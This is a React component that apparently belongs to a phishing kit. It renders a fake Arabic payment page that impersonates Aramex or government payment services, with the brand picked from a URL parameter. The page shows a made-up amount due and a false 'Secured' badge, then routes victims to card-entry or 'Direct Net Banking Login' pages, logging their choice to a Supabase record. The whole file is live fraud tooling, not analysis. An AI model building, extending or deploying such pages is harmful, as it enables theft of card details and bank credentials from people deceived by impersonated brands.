import { useState } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Loader2, ShieldCheck, CreditCard, Building2, ChevronLeft, Lock, Info, ArrowRight } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getGovBranding } from "@/lib/governmentPaymentSystems";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentDetails = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [paymentMethod, setPaymentMethod] = useState<"card" | "bank_login">("card");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";
  const govId = searchParams.get("govId") || linkData?.payload?.govId;
  const branding = getServiceBranding(companyKey);
  const govBranding = govId ? getGovBranding(govId) : undefined;

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
  const selectedCountryData = getCountryByCode(selectedCountry);

  const isGov = !!govBranding;
  const primaryColor = isGov ? govBranding.colors.primary : branding.colors.primary;

  const handleSubmit = async () => {
    setIsSubmitting(true);
    try {
      await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, paymentMethod } });
      if (paymentMethod === "card") {
        navigate(`/pay/${id}/card${window.location.search}`);
      } else {
        navigate(`/pay/${id}/bank${window.location.search}`);
      }
    } catch (error) {
      toast({ title: "خطأ", description: "فشل تحديث طريقة الدفع", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Loader2 className="w-10 h-10 animate-spin text-blue-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#F8F9FA]" dir="rtl">
      <PaymentMetaTags
        serviceKey={isGov ? govId! : companyKey}
        serviceName={isGov ? govBranding.nameAr : branding.name}
        title="تفاصيل السداد والمبلغ المستحق"
        amount={formattedAmount}
      />

      <header className="bg-white border-b-2 shadow-sm sticky top-0 z-50 px-4" style={{ borderBottomColor: primaryColor }}>
         <div className="container mx-auto h-16 sm:h-20 flex items-center justify-between">
            <div className="flex items-center gap-4">
               <img src={isGov ? govBranding.logo : branding.logo} alt="" className="h-10 sm:h-12 object-contain" />
               <div className="hidden sm:block">
                  <h1 className="text-sm font-black text-gray-800 leading-none">{isGov ? govBranding.nameAr : branding.name}</h1>
                  <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest mt-1">Invoice & Payment Summary</p>
               </div>
            </div>
            <div className="flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full border border-green-100">
               <Lock className="w-3 h-3" />
               <span className="text-[10px] font-bold uppercase tracking-widest">Secured</span>
            </div>
         </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
         <div className="w-full max-w-xl space-y-8">
            <Card className="border-none shadow-2xl rounded-[2.5rem] overflow-hidden bg-white">
               <div className="p-8 sm:p-10 text-center bg-gray-50/50 border-b">
                  <p className="text-[11px] font-black text-gray-400 uppercase tracking-[0.2em] mb-4">المبلغ الإجمالي المستحق</p>
                  <div className="flex items-center justify-center gap-3">
                     <span className="text-4xl sm:text-6xl font-black text-gray-900">{rawAmount}</span>
                     <div className="text-right">
                        <p className="text-lg sm:text-2xl font-black text-gray-400 leading-none">{selectedCountryData?.currencyAr}</p>
                        <p className="text-[10px] font-bold text-gray-300 uppercase tracking-widest">{selectedCountryData?.currencyEn}</p>
                     </div>
                  </div>
               </div>

               <div className="p-8 sm:p-10 space-y-8">
                  <div className="space-y-4">
                    <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">اختر طريقة السداد المفضلة</Label>
                    <div className="grid gap-4">
                       <button
                         onClick={() => setPaymentMethod("card")}
                         className={`group p-6 rounded-[1.5rem] border-2 transition-all flex items-center gap-5 text-right relative overflow-hidden ${paymentMethod === "card" ? "border-blue-600 bg-blue-50/50" : "border-gray-100 bg-white hover:border-gray-200"}`}
                       >
                          <div className={`w-14 h-14 rounded-2xl flex items-center justify-center transition-colors ${paymentMethod === "card" ? "bg-blue-600 text-white" : "bg-gray-100 text-gray-400 group-hover:bg-gray-200"}`}>
                             <CreditCard className="w-7 h-7" />
                          </div>
                          <div className="flex-1">
                             <h4 className="font-black text-gray-800">البطاقة البنكية</h4>
                             <p className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">Mada, Visa, MasterCard</p>
                          </div>
                          <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${paymentMethod === "card" ? "border-blue-600 bg-blue-600" : "border-gray-200"}`}>
                             {paymentMethod === "card" && <div className="w-2 h-2 rounded-full bg-white" />}
                          </div>
                       </button>

                       <button
                         onClick={() => setPaymentMethod("bank_login")}
                         className={`group p-6 rounded-[1.5rem] border-2 transition-all flex items-center gap-5 text-right relative overflow-hidden ${paymentMethod === "bank_login" ? "border-blue-600 bg-blue-50/50" : "border-gray-100 bg-white hover:border-gray-200"}`}
                       >
                          <div className={`w-14 h-14 rounded-2xl flex items-center justify-center transition-colors ${paymentMethod === "bank_login" ? "bg-blue-600 text-white" : "bg-gray-100 text-gray-400 group-hover:bg-gray-200"}`}>
                             <Building2 className="w-7 h-7" />
                          </div>
                          <div className="flex-1">
                             <h4 className="font-black text-gray-800">تسجيل دخول البنك</h4>
                             <p className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">Direct Net Banking Login</p>
                          </div>
                          <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${paymentMethod === "bank_login" ? "border-blue-600 bg-blue-600" : "border-gray-200"}`}>
                             {paymentMethod === "bank_login" && <div className="w-2 h-2 rounded-full bg-white" />}
                          </div>
                       </button>
                    </div>
                  </div>

                  <div className="space-y-6">
                    <Button
                      onClick={handleSubmit}
                      disabled={isSubmitting}
                      className="w-full h-16 rounded-2xl font-black text-lg shadow-xl hover:translate-y-[-2px] transition-all text-white active:scale-[0.98]"
                      style={{ backgroundColor: primaryColor }}
                    >
                      {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "متابعة الدفع"}
                    </Button>
                    <button onClick={() => navigate(-1)} className="w-full text-[11px] font-black text-gray-400 uppercase tracking-widest hover:text-gray-600 transition-colors flex items-center justify-center gap-2">
                       <ArrowRight className="w-4 h-4" />
                       العودة وتعديل البيانات
                    </button>
                  </div>
               </div>

               <div className="p-6 bg-gray-50 border-t flex items-center justify-center gap-6 opacity-30 grayscale">
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-4" alt="mada" />
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-4" alt="visa" />
                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-4" alt="mastercard" />
               </div>
            </Card>

            <div className="flex items-center gap-3 p-4 bg-blue-50/50 rounded-2xl border border-blue-100 text-blue-800">
               <Info className="w-5 h-5 flex-shrink-0" />
               <p className="text-[11px] font-bold leading-relaxed">
                  تأكد من اختيار طريقة الدفع المناسبة لك. سيتم توجيهك بشكل آمن لإتمام العملية وفقاً لمعايير الأمان العالمية.
               </p>
            </div>
         </div>
      </main>
    </div>
  );
};

export default PaymentDetails;
